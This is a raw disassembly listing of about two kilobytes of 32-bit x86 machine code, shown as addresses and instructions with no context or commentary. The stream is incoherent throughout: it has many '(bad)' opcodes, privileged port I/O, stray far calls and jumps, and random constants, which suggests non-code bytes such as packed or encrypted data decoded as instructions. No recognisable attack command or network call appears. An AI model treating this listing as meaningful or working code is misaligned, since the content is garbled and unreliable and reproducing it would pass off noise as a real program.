  4148a5:	fidiv  WORD PTR [ecx]
  4148a7:	push   ds
  4148a8:	sub    BYTE PTR [edx],0x24
  4148ab:	jecxz  0x41487a
  4148ad:	dec    ecx
  4148ae:	sbb    ecx,DWORD PTR [edi*8-0x4fd78c29]
  4148b5:	out    dx,eax
  4148b6:	das    
  4148b7:	mov    fs,ebp
  4148b9:	lock loopne 0x4148ca
  4148bc:	mov    ah,BYTE PTR [esi+0x427a2f37]
  4148c2:	lds    ebp,FWORD PTR [esp+eiz*8+0x296edeca]
  4148c9:	push   ebp
  4148ca:	imul   ebx,DWORD PTR [eax-0x64],0x68
  4148ce:	fadd   st(3),st
  4148d0:	or     al,0xbc
  4148d2:	pop    ds
  4148d3:	into   
  4148d4:	inc    ebx
  4148d5:	dec    ebp
  4148d6:	or     BYTE PTR [ecx],al
  4148d8:	mov    ds:0x19c9e593,al
  4148dd:	inc    BYTE PTR [ecx]
  4148df:	mov    edx,0x3666ec52
  4148e4:	pop    eax
  4148e5:	dec    ecx
  4148e6:	jns    0x41494e
  4148e8:	je     0x414874
  4148ea:	cmp    ebp,DWORD PTR [esi+esi*4]
  4148ed:	xor    ecx,DWORD PTR [esi+0x30]
  4148f0:	adc    BYTE PTR [edx-0x3968221e],bl
  4148f6:	retf   
  4148f7:	ja     0x4148a6
  4148f9:	push   ecx
  4148fa:	inc    ebp
  4148fb:	mov    edi,0x81920316
  414900:	sub    BYTE PTR [ebx],al
  414902:	dec    eax
  414903:	(bad)  
  414904:	jl     0x414923
  414906:	cmp    ecx,ebx
  414908:	xchg   ebp,eax
  414909:	xchg   ebp,eax
  41490a:	repnz daa 
  41490c:	mov    bl,0xcc
  41490e:	pushf  
  41490f:	adc    eax,0x6277981d
  414914:	inc    edi
  414915:	jns    0x41490a
  414917:	aas    
  414918:	inc    edx
  414919:	mov    ds:0x1da983bc,al
  41491e:	sbb    eax,0x84d9b83d
  414923:	mov    dl,0x3d
  414925:	lds    ecx,FWORD PTR [ecx]
  414927:	dec    ebx
  414928:	test   DWORD PTR [ecx+0x5c19fcc5],ecx
  41492e:	sub    BYTE PTR [ebp+0x35790feb],dh
  414934:	arpl   WORD PTR [esi+ecx*4],cx
  414937:	arpl   WORD PTR [eax+0x118e2b96],bx
  41493d:	aad    0x23
  41493f:	or     eax,0xbe1f687
  414944:	lods   eax,DWORD PTR ds:[esi]
  414945:	mov    dh,BYTE PTR [ebp-0x331105bf]
  41494b:	imul   bh
  41494d:	pop    ebx
  41494e:	or     DWORD PTR [edx+ebp*4+0x6c65f211],ebx
  414955:	xor    eax,0xe0f55eb4
  41495a:	adc    bh,BYTE PTR [esi]
  41495c:	push   0xffffffa6
  41495e:	popf   
  41495f:	inc    ebx
  414960:	sbb    eax,ebp
  414962:	sbb    al,0x61
  414964:	stc    
  414965:	sub    edx,DWORD PTR [edx+ebx*1-0x5e668835]
  41496c:	aad    0x77
  41496e:	dec    edi
  41496f:	(bad)
  414973:	in     eax,0xa2
  414975:	push   esi
  414976:	sub    BYTE PTR [edx+0x2a],cl
  414979:	mov    cl,0xf8
  41497b:	adc    al,0x60
  41497d:	mov    dl,BYTE PTR [ecx]
  41497f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414980:	sbb    ecx,DWORD PTR [esi-0x1a1a5305]
  414986:	add    BYTE PTR [esi+0x55d9662a],al
  41498c:	call   0x3083:0x70ada956
  414993:	lock sbb ecx,edx
  414996:	inc    ecx
  414997:	push   cs
  414998:	jge    0x4149ca
  41499a:	cmp    BYTE PTR [edi+0x1f],dh
  41499d:	jge    0x41499b
  41499f:	adc    BYTE PTR [ebp+0x4935e238],bl
  4149a5:	test   eax,0x69ce7f49
  4149aa:	in     al,0x43
  4149ac:	fbld   TBYTE PTR [eax+0x47]
  4149af:	adc    BYTE PTR [ecx+0x11],dh
  4149b2:	mov    dl,0x81
  4149b4:	addr16 dec eax
  4149b6:	stos   BYTE PTR es:[edi],al
  4149b7:	lahf   
  4149b8:	jle    0x41497d
  4149ba:	and    cl,BYTE PTR [ecx+0x42]
  4149bd:	mov    al,ds:0x2f1f176a
  4149c2:	mov    ch,0x4e
  4149c4:	cli    
  4149c5:	nop
  4149c6:	dec    esp
  4149c7:	xor    cl,ah
  4149c9:	xchg   ebp,eax
  4149ca:	mov    ch,0x1f
  4149cc:	sub    BYTE PTR [edx],dh
  4149ce:	leave  
  4149cf:	imul   edi
  4149d1:	gs add al,0xc6
  4149d4:	fistp  QWORD PTR [esi-0x77f0827]
  4149da:	ds push esi
  4149dc:	jp     0x414974
  4149de:	dec    ebp
  4149df:	clc    
  4149e0:	mov    ah,0xf1
  4149e2:	push   ecx
  4149e3:	sar    BYTE PTR [edx-0x1c],1
  4149e6:	stos   DWORD PTR es:[edi],eax
  4149e7:	call   0x9418:0x6df006f3
  4149ee:	pop    ss
  4149ef:	pop    ss
  4149f0:	add    DWORD PTR [ebp+0x1ef37f21],edi
  4149f6:	mov    esi,0xd22f9705
  4149fb:	add    al,0x73
  4149fd:	mov    edi,0xefe3d704
  414a02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a03:	xchg   esi,eax
  414a04:	data16 shr bh,0xd8
  414a08:	mov    BYTE PTR [ecx+0x59],0x1c
  414a0c:	mov    WORD PTR [ecx],fs
  414a0e:	and    eax,0x1a9bc484
  414a13:	dec    eax
  414a14:	or     edi,DWORD PTR [eax+0x4670b264]
  414a1a:	nop
  414a1b:	xchg   BYTE PTR [esi-0x1b70948f],bl
  414a21:	mov    ebp,0x3c51ae8
  414a26:	je     0x4149dd
  414a28:	fwait
  414a29:	dec    ecx
  414a2a:	pop    esi
  414a2b:	inc    esi
  414a2c:	cld    
  414a2d:	hlt    
  414a2e:	mov    WORD PTR [ebx],?
  414a30:	sbb    cl,BYTE PTR [esi]
  414a32:	aad    0x48
  414a34:	and    DWORD PTR [eax+0x426c31d6],ebp
  414a3a:	push   ebx
  414a3b:	mov    eax,ds:0x30a3ebd6
  414a40:	adc    DWORD PTR [ebx+0x34b8a798],0xa6f72dfb
  414a4a:	sbb    BYTE PTR [eax+0x5c],cl
  414a4d:	cs pop edx
  414a4f:	mov    eax,ds:0x75cc92d2
  414a54:	cmc    
  414a55:	mov    ecx,0x370be26b
  414a5a:	sub    esp,DWORD PTR [eax+ebx*4-0x3b42396e]
  414a61:	mov    ecx,0x3524be3b
  414a66:	jne    0x414a81
  414a68:	dec    edx
  414a69:	dec    esi
  414a6a:	mov    ds:0xb95d2054,eax
  414a6f:	mov    esp,0xd79449e9
  414a74:	mov    ebx,0x3a87840e
  414a79:	or     eax,eax
  414a7b:	inc    ecx
  414a7c:	(bad)  [esi+0x4d]
  414a7f:	lea    ecx,[edi+0x12499260]
  414a85:	test   DWORD PTR [edx-0x7],0xc4af6956
  414a8c:	sar    bl,0xd5
  414a8f:	ins    DWORD PTR es:[edi],dx
  414a90:	push   es
  414a91:	push   ds
  414a92:	cmp    ebx,esi
  414a94:	imul   esp,DWORD PTR [eax],0x84f6f821
  414a9a:	add    eax,0x1e877da6
  414a9f:	pop    eax
  414aa0:	or     esi,DWORD PTR [ebp+0x4a]
  414aa3:	jbe    0x414a25
  414aa5:	(bad)  
  414aa6:	mov    cl,0x2b
  414aa8:	call   0x139b932c
  414aad:	test   al,0x90
  414aaf:	ds push eax
  414ab1:	(bad)  
  414ab2:	and    dh,bl
  414ab4:	rcr    DWORD PTR [edx+edx*1-0x7a],1
  414ab8:	scas   al,BYTE PTR es:[edi]
  414ab9:	(bad)  
  414aba:	sbb    DWORD PTR [ebp+0x1b6cf94f],edi
  414ac0:	xchg   edi,eax
  414ac1:	fwait
  414ac2:	cmc    
  414ac3:	dec    ecx
  414ac4:	xor    BYTE PTR [ecx+esi*8+0x4c],dl
  414ac8:	call   0xe1aa48a6
  414acd:	add    eax,0x439bfc85
  414ad2:	xor    BYTE PTR [esi+eax*2+0x555a168c],0x7d
  414ada:	call   ebx
  414adc:	cmp    BYTE PTR [ebx+esi*1-0x9de3e7b],bh
  414ae3:	ror    BYTE PTR [edi-0x3ee79107],0x3a
  414aea:	addr16 adc al,0x45
  414aed:	or     DWORD PTR [esi],0xffffffb2
  414af0:	sbb    al,0x4d
  414af2:	pusha  
  414af3:	stos   BYTE PTR es:[edi],al
  414af4:	pop    ds
  414af5:	or     BYTE PTR [esi],0x9b
  414af8:	lds    esi,FWORD PTR [ecx+edx*1]
  414afb:	into   
  414afc:	cmp    al,BYTE PTR [ebp-0x2c]
  414aff:	lock popf 
  414b01:	jns    0x414adc
  414b03:	test   al,0xde
  414b05:	pop    esi
  414b06:	mov    ah,0x49
  414b08:	(bad)
  414b0b:	(bad)  
  414b0c:	hlt    
  414b0d:	push   esi
  414b0e:	pop    ds
  414b0f:	lahf   
  414b10:	addr16 loop 0x414ad5
  414b13:	mov    bl,0x10
  414b15:	in     eax,0x64
  414b17:	shl    BYTE PTR [eax],0xcb
  414b1a:	fcom   DWORD PTR [esi-0xc2e1ff3]
  414b20:	int    0x28
  414b22:	mov    al,0xf6
  414b24:	sub    DWORD PTR [ebx],ecx
  414b26:	shl    BYTE PTR [edi+0x3f],0xac
  414b2a:	cli    
  414b2b:	idiv   BYTE PTR [edi]
  414b2d:	in     al,dx
  414b2e:	iret   
  414b2f:	loope  0x414b88
  414b31:	(bad)  
  414b34:	sub    dh,BYTE PTR [edx+edi*8-0x54]
  414b38:	sti    
  414b39:	mov    esp,0x1773cc8d
  414b3e:	cmp    al,0x25
  414b40:	or     al,0xef
  414b42:	ror    edx,cl
  414b44:	mov    dl,0x64
  414b46:	sub    BYTE PTR [ebx+ebx*8-0x2518f630],ah
  414b4d:	jne    0x414b86
  414b4f:	outs   dx,BYTE PTR ds:[esi]
  414b50:	icebp  
  414b51:	cmc    
  414b52:	or     bh,BYTE PTR [eax-0x75646d48]
  414b58:	test   BYTE PTR [edx-0x4],ch
  414b5b:	push   ebx
  414b5c:	aam    0xe9
  414b5e:	dec    edi
  414b5f:	lea    ecx,[ebx-0x197b4b70]
  414b65:	sub    esi,eax
  414b67:	jp     0x414b68
  414b69:	das    
  414b6a:	mov    eax,0x207a91ef
  414b6f:	add    DWORD PTR [ebx-0x56],eax
  414b72:	mov    bh,0x80
  414b74:	cmc    
  414b75:	hlt    
  414b76:	or     eax,0xb82e1e42
  414b7b:	sub    al,0x16
  414b7d:	and    BYTE PTR [eax+ebx*1+0x34],dl
  414b81:	push   es
  414b82:	mov    eax,ds:0x57528aa0
  414b87:	fst    QWORD PTR [ecx+0x58c9e103]
  414b8d:	and    dh,ch
  414b8f:	inc    ebx
  414b90:	ret    
  414b91:	fidivr DWORD PTR [esi]
  414b93:	mov    bl,0xf0
  414b95:	dec    ebp
  414b96:	(bad)  
  414b97:	aas    
  414b98:	sub    DWORD PTR cs:[ebp+0x301d80be],ebp
  414b9f:	push   DWORD PTR [ebx-0x6a8a1416]
  414ba5:	cld    
  414ba6:	jge    0x414b6a
  414ba8:	addr16 mov dl,0x68
  414bab:	dec    esp
  414bac:	aas    
  414bad:	into   
  414bae:	loope  0x414c0e
  414bb0:	out    0xff,eax
  414bb2:	inc    esi
  414bb3:	(bad)  
  414bb4:	push   ecx
  414bb5:	int3   
  414bb6:	dec    esp
  414bb7:	mov    ah,bl
  414bb9:	mov    ds,eax
  414bbb:	ins    DWORD PTR es:[edi],dx
  414bbc:	outs   dx,BYTE PTR ds:[esi]
  414bbd:	ja     0x414bc4
  414bbf:	(bad)  
  414bc0:	cdq    
  414bc1:	push   edi
  414bc2:	mov    ecx,0xbcfd2daa
  414bc7:	sub    BYTE PTR [esi+edi*2],0xf2
  414bcb:	mov    edx,0x514fe0b7
  414bd0:	repnz aaa 
  414bd2:	sub    eax,0xbd00a494
  414bd7:	xchg   edx,eax
  414bd8:	(bad)  
  414bd9:	in     eax,dx
  414bda:	sbb    ch,BYTE PTR [esi]
  414bdc:	cmp    ebx,DWORD PTR [eax]
  414bde:	in     al,dx
  414bdf:	or     BYTE PTR [ecx+0x35],bh
  414be2:	sub    eax,0xbac8c2d0
  414be7:	adc    cl,bl
  414be9:	iret   
  414bea:	adc    dl,BYTE PTR [edi]
  414bec:	lods   eax,DWORD PTR ds:[esi]
  414bed:	adc    dl,bl
  414bef:	jbe    0x414c57
  414bf1:	iret   
  414bf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bf3:	cmp    DWORD PTR [ecx],edx
  414bf5:	and    DWORD PTR [ebx],edx
  414bf7:	loop   0x414c5f
  414bf9:	out    0xd0,al
  414bfb:	adc    BYTE PTR ds:0xd78e6835,dh
  414c01:	aaa    
  414c02:	loope  0x414bf9
  414c04:	pop    eax
  414c05:	fadd   QWORD PTR [edi+edx*2-0x64]
  414c09:	(bad)  
  414c0a:	adc    eax,0x6616a96d
  414c0f:	mov    al,0x20
  414c11:	jo     0x414c74
  414c13:	xor    al,0x41
  414c15:	es jmp 0x61ec4d6e
  414c1b:	pusha  
  414c1c:	outs   dx,BYTE PTR ds:[esi]
  414c1d:	es clc 
  414c1f:	dec    esp
  414c20:	push   esi
  414c21:	cmp    esi,DWORD PTR [edx]
  414c23:	outs   dx,DWORD PTR ds:[esi]
  414c24:	adc    ah,BYTE PTR [eax]
  414c26:	mov    cl,0x3b
  414c28:	jmp    0x867b:0xff7123c0
  414c2f:	outs   dx,BYTE PTR ds:[esi]
  414c30:	xlat   BYTE PTR ds:[ebx]
  414c31:	nop
  414c32:	dec    esp
  414c33:	jmp    DWORD PTR [edi+0x2fa4e9fd]
  414c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c3a:	cmp    dh,BYTE PTR [ebp+0x49]
  414c3d:	jb     0x414c5b
  414c3f:	in     al,dx
  414c40:	pop    edi
  414c41:	(bad)  
  414c42:	fild   QWORD PTR [ecx+0x33edd246]
  414c48:	sub    al,0x14
  414c4a:	daa    
  414c4b:	out    0x22,eax
  414c4d:	xor    eax,0xda42e414
  414c52:	test   DWORD PTR [edx+0x68704e84],ebp
  414c58:	mov    ds:0x21a5886f,eax
  414c5d:	jmp    0xf0fe467f
  414c62:	lock and DWORD PTR [edx+ecx*8+0xa772bd2],ebx
  414c6a:	add    bh,BYTE PTR [ecx-0x3737f640]
  414c70:	or     edx,DWORD PTR [edi-0x63]
  414c73:	mov    eax,ds:0xa3c721c
  414c78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c79:	xchg   ecx,eax
  414c7a:	push   edx
  414c7b:	out    0xc3,eax
  414c7d:	(bad)  
  414c7e:	call   0xec19:0x8a044df
  414c85:	ja     0x414c28
  414c87:	push   edx
  414c88:	(bad)  
  414c8a:	fwait
  414c8b:	call   0x6621:0x8eb3c09f
  414c92:	ror    DWORD PTR [esi+0x3f23e4ed],0x3a
  414c99:	lahf   
  414c9a:	test   DWORD PTR [esi],edx
  414c9c:	add    BYTE PTR [edi+0x257bde9d],dl
  414ca2:	cwde   
  414ca3:	mov    bh,0xa9
  414ca5:	mov    al,0x48
  414ca7:	sub    al,0x77
  414ca9:	ret    
  414caa:	xor    BYTE PTR [ebx+ebx*1+0x4b],al
  414cae:	stos   BYTE PTR es:[edi],al
  414caf:	inc    eax
  414cb0:	inc    edi
  414cb1:	sbb    al,0x14
  414cb3:	lock daa 
  414cb5:	daa    
  414cb6:	jns    0x414c9b
  414cb8:	mov    ds:0x5db90ded,al
  414cbd:	int    0x11
  414cbf:	scas   al,BYTE PTR es:[edi]
  414cc0:	jo     0x414cb3
  414cc2:	and    dh,BYTE PTR [esi+0x4dd75b89]
  414cc8:	pop    ecx
  414cc9:	sub    ebp,DWORD PTR [ebx-0x19]
  414ccc:	xor    dh,BYTE PTR [edx]
  414cce:	retf   0x9d49
  414cd1:	(bad)
  414cd6:	xchg   edi,eax
  414cd7:	sub    edi,DWORD PTR [eax]
  414cd9:	and    DWORD PTR [esi],esi
  414cdb:	call   0xc1bdbce4
  414ce0:	aad    0x28
  414ce2:	pop    edx
  414ce3:	and    BYTE PTR [edi-0x529fc34a],dh
  414ce9:	sbb    eax,0x279fd86e
  414cee:	mov    ebp,0x35b21ec5
  414cf3:	idiv   DWORD PTR [eax]
  414cf5:	repnz dec edi
  414cf7:	push   edi
  414cf8:	inc    edi
  414cf9:	pushf  
  414cfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cfb:	dec    ecx
  414cfc:	dec    edx
  414cfd:	pop    DWORD PTR [ebx+0x0]
  414d00:	fwait
  414d01:	(bad)
  414d06:	out    dx,eax
  414d07:	lar    edx,WORD PTR [ecx+0x13]
  414d0b:	mov    edi,0x9e417378
  414d10:	jns    0x414d73
  414d12:	or     DWORD PTR [ebx-0x1096d4f9],0xa70b084c
  414d1c:	mov    ds:0xc8740645,eax
  414d21:	adc    cl,bh
  414d23:	mov    ah,0x1
  414d25:	addr16 pop esp
  414d27:	into   
  414d28:	int    0x1b
  414d2a:	jge    0x414d31
  414d2c:	sbb    ebp,esi
  414d2e:	pop    edx
  414d2f:	jae    0x414d2c
  414d31:	retf   
  414d32:	mov    esi,0x444147b0
  414d37:	dec    ecx
  414d38:	mov    DWORD PTR [esi+0x5],0xca19e0d4
  414d3f:	mov    DWORD PTR [ebx+0x33e6fe29],esp
  414d45:	je     0x414da9
  414d47:	jno    0x414d8e
  414d49:	(bad)  
  414d4a:	jo     0x414d49
  414d4c:	std    
  414d4d:	xchg   edx,eax
  414d4e:	push   edi
  414d4f:	popa   
  414d50:	jmp    0xb3fa:0x4ebe90a8
  414d57:	shr    ebx,0x48
  414d5a:	or     DWORD PTR [ebp-0x40ab60d5],ebx
  414d60:	fldl2e 
  414d62:	pop    edx
  414d63:	popa   
  414d64:	hlt    
  414d65:	sbb    bh,ch
  414d67:	sub    BYTE PTR [edi],bh
  414d69:	not    DWORD PTR ds:0xc789dc24
  414d6f:	jle    0x414d67
  414d71:	dec    ebx
  414d72:	shr    BYTE PTR [esi-0x6c94717f],0xb4
  414d79:	jl     0x414db0
  414d7b:	pop    eax
  414d7c:	dec    edi
  414d7d:	xor    ecx,esp
  414d7f:	mov    ch,0xd4
  414d81:	jnp    0x414dd4
  414d83:	pop    ds
  414d84:	push   edx
  414d85:	jo     0x414df7
  414d87:	jmp    0x4fd4f60a
  414d8c:	fdivrp st(6),st
  414d8e:	jecxz  0x414dd8
  414d90:	ffree  st(4)
  414d92:	mov    DWORD PTR [edx-0x3f8d767f],eax
  414d98:	mov    al,ds:0xb1bff177
  414d9d:	adc    DWORD PTR [edx-0x58],eax
  414da0:	mov    al,ds:0xf35ed86
  414da5:	mov    ebp,0x9341e204
  414daa:	shr    BYTE PTR [ecx],cl
  414dac:	push   0xfc457fbf
  414db1:	jl     0x414de7
  414db3:	inc    esi
  414db4:	imul   ebp,DWORD PTR [esi],0x4ee1c94e
  414dba:	sub    eax,0xcbc18300
  414dbf:	clc    
  414dc0:	ins    DWORD PTR es:[edi],dx
  414dc1:	sub    eax,0xe32f44f7
  414dc6:	inc    edi
  414dc7:	push   bx
  414dc9:	cld    
  414dca:	xchg   ebx,eax
  414dcb:	lea    esi,[ebx-0x49186e36]
  414dd1:	jo     0x414e3f
  414dd3:	aam    0xd3
  414dd5:	xchg   edi,eax
  414dd6:	sub    BYTE PTR [esi-0x41],al
  414dd9:	aad    0x6c
  414ddb:	aam    0x36
  414ddd:	push   edi
  414dde:	fild   DWORD PTR [edi-0x24d56f9]
  414de4:	std    
  414de5:	mov    ecx,0xff6682de
  414dea:	aaa    
  414deb:	inc    eax
  414dec:	adc    DWORD PTR [eax-0x3b],edx
  414def:	stc    
  414df0:	leave  
  414df1:	lock dec eax
  414df3:	jno    0x414db4
  414df5:	arpl   WORD PTR [ecx-0x1f1d61b6],ax
  414dfb:	fldenv [ecx]
  414dfd:	add    al,BYTE PTR [ecx-0x28]
  414e00:	into   
  414e01:	aad    0x1
  414e03:	cld    
  414e04:	push   0x84d109b
  414e09:	jmp    0xb374:0xaa323516
  414e10:	shr    BYTE PTR [edi-0x46decc8c],cl
  414e16:	ins    DWORD PTR es:[edi],dx
  414e17:	aaa    
  414e18:	(bad)  
  414e19:	and    eax,0xe7842da2
  414e1e:	mov    bh,0xee
  414e20:	push   edx
  414e21:	adc    ebx,DWORD PTR [esi-0x3f8aac9c]
  414e27:	ret    0xeeac
  414e2a:	jmp    0x7cbbd10
  414e2f:	inc    ecx
  414e30:	test   eax,0x1f0e1d74
  414e35:	jns    0x414dbd
  414e37:	add    al,BYTE PTR [ebx+0x40]
  414e3a:	push   edi
  414e3b:	lods   eax,DWORD PTR ds:[esi]
  414e3c:	xchg   edx,eax
  414e3d:	adc    eax,0xfa63823f
  414e42:	dec    esi
  414e43:	fxch   st(5)
  414e45:	sar    DWORD PTR [esi-0x2b],0x94
  414e49:	dec    ecx
  414e4a:	fisubr DWORD PTR [eax-0x5f478309]
  414e50:	jne    0x414e39
  414e52:	std    
  414e53:	les    ecx,FWORD PTR [edi+0x1853e678]
  414e59:	mov    BYTE PTR [edi+0x2c5cb668],bl
  414e5f:	mov    edi,0x641ff29
  414e64:	in     eax,dx
  414e65:	jns    0x414e11
  414e67:	gs adc edi,esi
  414e6a:	mov    ch,0xd0
  414e6c:	test   DWORD PTR [esi-0x68783cb6],edi
  414e72:	out    dx,al
  414e73:	push   0xffffffd7
  414e75:	lds    esi,FWORD PTR [edx-0x4328711b]
  414e7b:	jp     0x414ec8
  414e7d:	es mov edi,0x26357f3c
  414e83:	out    0x81,eax
  414e85:	inc    ecx
  414e86:	mov    esp,0x67a32cc9
  414e8b:	das    
  414e8c:	dec    ebx
  414e8d:	daa    
  414e8e:	outs   dx,DWORD PTR ds:[esi]
  414e8f:	retf   0x4223
  414e92:	mov    ecx,0xd4e9f71e
  414e97:	aam    0x9f
  414e99:	loope  0x414eb7
  414e9b:	imul   DWORD PTR [ecx-0x257fa3d0]
  414ea1:	loopne 0x414e90
  414ea3:	jno    0x414ef5
  414ea5:	adc    BYTE PTR [edx+0x60b4ca7f],ch
  414eab:	xlat   BYTE PTR ds:[ebx]
  414eac:	dec    ecx
  414ead:	shl    DWORD PTR ds:0x721c3198,1
  414eb3:	adc    BYTE PTR [ebp-0x6de5f96a],cl
  414eb9:	(bad)  
  414eba:	adc    DWORD PTR [esi+ebx*1+0x63b6097f],eax
  414ec1:	xchg   ebp,eax
  414ec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ec3:	enter  0xa93a,0x10
  414ec7:	jmp    0x414e74
  414ec9:	mov    BYTE PTR [ebp+0x41],al
  414ecc:	jae    0x414ef5
  414ece:	or     DWORD PTR [eax],ebp
  414ed0:	cdq    
  414ed1:	sbb    cl,al
  414ed3:	or     dh,dl
  414ed5:	inc    eax
  414ed6:	cmc    
  414ed7:	xchg   esp,eax
  414ed8:	rol    DWORD PTR [ecx+eax*4],1
  414edb:	mov    ah,0xe2
  414edd:	je     0x414f3f
  414edf:	div    cl
  414ee1:	ins    BYTE PTR es:[edi],dx
  414ee2:	ja     0x414ebc
  414ee4:	cmc    
  414ee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ee6:	in     al,dx
  414ee7:	fidivr WORD PTR [ebp+edi*4-0x258ea4e5]
  414eee:	ret    0x116d
  414ef1:	add    ecx,ecx
  414ef3:	cdq    
  414ef4:	retf   0xd879
  414ef7:	jmp    0x414eb2
  414ef9:	inc    edx
  414efa:	les    esi,FWORD PTR [esi]
  414efc:	and    bh,BYTE PTR [edx-0x3dae8a37]
  414f02:	inc    ebx
  414f03:	outs   dx,DWORD PTR ds:[esi]
  414f04:	rcl    BYTE PTR cs:[edi+0xc],0xc0
  414f09:	jmp    0xe079:0xa4da6c5c
  414f10:	jnp    0x414f13
  414f12:	cmp    bh,BYTE PTR [edi+0x7dd8671e]
  414f18:	or     cl,0x30
  414f1b:	or     esi,edi
  414f1d:	(bad)  
  414f1e:	jns    0x414f74
  414f20:	and    esi,DWORD PTR [eax-0x59808ad0]
  414f26:	stc    
  414f27:	jmp    0x414f30
  414f29:	retf   
  414f2a:	xchg   esp,eax
  414f2b:	adc    eax,0xecbc3396
  414f30:	rcr    DWORD PTR [ebx],cl
  414f32:	call   0xe7f4:0x3507dab1
  414f39:	imul   eax,DWORD PTR [esi],0x1f3b9082
  414f3f:	out    dx,eax
  414f40:	aam    0x44
  414f42:	mov    ch,cl
  414f44:	out    0xda,eax
  414f46:	jp     0x414f35
  414f48:	push   ebp
  414f49:	pop    edi
  414f4a:	call   0x6a15:0xb628fc07
  414f51:	leave  
  414f52:	popf   
  414f53:	outs   dx,BYTE PTR ds:[esi]
  414f54:	stos   BYTE PTR es:[edi],al
  414f55:	ficom  DWORD PTR [eax+0x60]
  414f58:	xchg   BYTE PTR [ebx-0x5a],dh
  414f5b:	pop    es
  414f5c:	pop    ss
  414f5d:	les    edx,FWORD PTR [ebx+0xa]
  414f60:	bound  ecx,QWORD PTR [ebx-0x30]
  414f63:	(bad)  
  414f64:	mov    ds:0x2434cced,al
  414f69:	shl    DWORD PTR [esi],1
  414f6b:	mov    esp,0x267ca864
  414f70:	jl     0x414f90
  414f72:	jae    0x414f30
  414f74:	pop    ecx
  414f75:	sub    esp,edi
  414f77:	sar    BYTE PTR [esi-0x25ecb141],1
  414f7d:	(bad)  
  414f7e:	cmp    DWORD PTR [esi-0x7a6d423c],eax
  414f84:	pop    esi
  414f85:	and    al,0xb1
  414f87:	cwde   
  414f88:	jmp    0x414f42
  414f8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f8b:	jae    0x414fb1
  414f8d:	and    BYTE PTR [edx+edx*2-0x3a],ah
  414f91:	pop    ecx
  414f92:	lds    ebp,FWORD PTR [ecx+0x32]
  414f95:	xor    DWORD PTR [esi+0x2963720a],0xd9e20649
  414f9f:	inc    esi
  414fa0:	sub    ah,BYTE PTR [esi+esi*1-0x40167b15]
  414fa7:	inc    edx
  414fa8:	jl     0x414f7a
  414faa:	pop    ebp
  414fab:	push   ebx
  414fac:	mov    dl,0xf3
  414fae:	push   esi
  414fb0:	inc    ebp
  414fb1:	stc    
  414fb2:	icebp  
  414fb3:	fiadd  WORD PTR [esi+0x74a95af0]
  414fb9:	adc    ch,BYTE PTR [ecx+ebx*1+0x76755ced]
  414fc0:	out    0x9f,al
  414fc2:	adc    bl,BYTE PTR [ecx+ebp*1+0x6e]
  414fc6:	jecxz  0x414fad
  414fc8:	(bad)  
  414fc9:	rcl    BYTE PTR ds:0x386b4f89,cl
  414fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fd0:	add    dh,bh
  414fd2:	push   ss
  414fd3:	dec    edi
  414fd4:	xchg   ecx,eax
  414fd5:	jmp    0x414fdb
  414fd7:	xor    DWORD PTR [ebx-0x1ac9f3ac],0x2fa61801
  414fe1:	push   ss
  414fe2:	mov    bl,0x83
  414fe4:	cmp    BYTE PTR [eax],bh
  414fe6:	sub    eax,0x17c9bf6a
  414feb:	inc    ax
  414fed:	fdivr  QWORD PTR [esi+0x3fc5af67]
  414ff3:	add    al,0x4c
  414ff5:	ss cmp al,0x21
  414ff8:	adc    BYTE PTR [ebx+0x70a145b5],cl
  414ffe:	jmp    0xf5ad084f
  415003:	xor    BYTE PTR [edi+eax*2+0x5f],ch
  415007:	leave  
  415008:	push   esi
  415009:	call   0xf86e2187
  41500e:	mov    cl,0x6a
  415010:	sub    al,0xa8
  415012:	jg     0x415037
  415014:	mov    cl,0xf9
  415016:	sbb    BYTE PTR [edi],ch
  415018:	pop    es
  415019:	mov    DWORD PTR [edi+0x24],esi
  41501c:	xchg   ebx,eax
  41501d:	mov    BYTE PTR [eax+0x63],al
  415020:	rcl    BYTE PTR [edx+0x40],1
  415023:	jp     0x414fa9
  415025:	and    eax,0xb6f303be
  41502a:	neg    BYTE PTR [ebx]
  41502c:	inc    edi
  41502d:	pop    es
  41502e:	dec    edi
  41502f:	jecxz  0x415098
  415031:	ins    DWORD PTR es:[edi],dx
  415032:	adc    eax,0xb1cfedbb
  415037:	in     al,0x47
  415039:	loopne 0x415042
  41503b:	pop    ds
  41503c:	pop    ebx
  41503d:	xor    eax,ecx
  41503f:	nop
  415040:	mul    DWORD PTR [edx]
  415042:	imul   ebp,DWORD PTR [edx+edx*2-0x35],0x5
  415047:	cdq    
  415048:	loope  0x415033
  41504a:	adc    ebp,DWORD PTR [eax]
  41504c:	mov    ds:0xf22d7b3e,eax
  415051:	dec    edx
  415052:	mov    ah,0xaa
  415054:	and    al,0x65
  415056:	jne    0x415018
  415058:	mov    ebx,0x19c16d24
  41505d:	aad    0xe1
  41505f:	cs xchg ah,dl
  415062:	shr    WORD PTR [eax+edi*8-0x6fb36d26],cl
  41506a:	out    dx,eax
  41506b:	mov    ds:0x3a89a7f0,al
  415070:	int3   
  415071:	cmp    bl,0x1a
  415074:	cli    
  415075:	pop    esp
  415076:	ficomp DWORD PTR [edx+0x4fbd6d7b]
  41507c:	mov    bl,0xc1
  41507e:	push   0x780f466d
  415083:	imul   esi,DWORD PTR [edx-0x38a1d30],0x7db3573c
  41508d:	shl    DWORD PTR [ecx],1
  41508f:	lds    edi,FWORD PTR [ecx-0x57]
  415092:	dec    ebp
  415093:	sub    BYTE PTR [edi],dh
  415095:	in     al,0x57
  415097:	mov    al,0x4a
  415099:	jb     0x415063
  41509b:	aad    0xaf
  41509d:	shl    DWORD PTR [ecx+0x15],cl
  4150a0:	push   es
  4150a1:	xlat   BYTE PTR ds:[ebx]
  4150a2:	rol    DWORD PTR [eax-0x6873ea40],cl
  4150a8:	xor    al,0xef
  4150aa:	sub    al,ah
  4150ac:	in     al,dx
  4150ad:	sbb    al,BYTE PTR [ecx+eax*1]
  4150b0:	mov    edi,0x87e20da1
